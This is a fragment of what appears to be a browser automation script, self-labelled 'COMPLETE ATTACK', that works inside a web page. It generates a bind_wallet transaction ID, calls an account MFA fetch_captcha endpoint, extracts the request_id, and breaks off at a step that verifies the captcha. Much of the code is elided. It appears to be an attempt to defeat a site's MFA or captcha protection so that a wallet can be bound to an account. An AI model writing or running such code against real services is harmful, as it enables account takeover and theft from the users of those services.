...
(async () => {
    console.log('🔥🔥🔥 COMPLETE ATTACK — fetch_captcha → verify → BIND');
    ...
    const result = await page.evaluate(async (refresh, fullParams, target, sitekey) => {
        ...
        // Step 4: Generate bind_wallet txn_id
        ...
        // Step 5: FETCH_CAPTCHA — gets the request_id!!!
        r = await fetch('/account/mfa/txn/v1/fetch_captcha?' + fullParams, {
            method: 'POST', headers: h,
            body: JSON.stringify({usage: 'bind_wallet', txn_id: txnId})
        });
        data = await r.json();
        log.push('5. fetch_captcha: ' + JSON.stringify(data));
        
        if (data.code !== 0) return {error: 'fetch_captcha fail', data, log};
        
        const requestId = data.data?.request_id || data.data?.data?.request_id;
        if (!requestId) {
            log.push('No request_id in response! Full data: ' + JSON.stringify(data));
            return {log, fetchCaptchaResult: data};
        }
        
        log.push('5. REQUEST_ID: ' + requestId);
        
        // Step 6: VERIFY CAPTCHA with correct request_id!!!
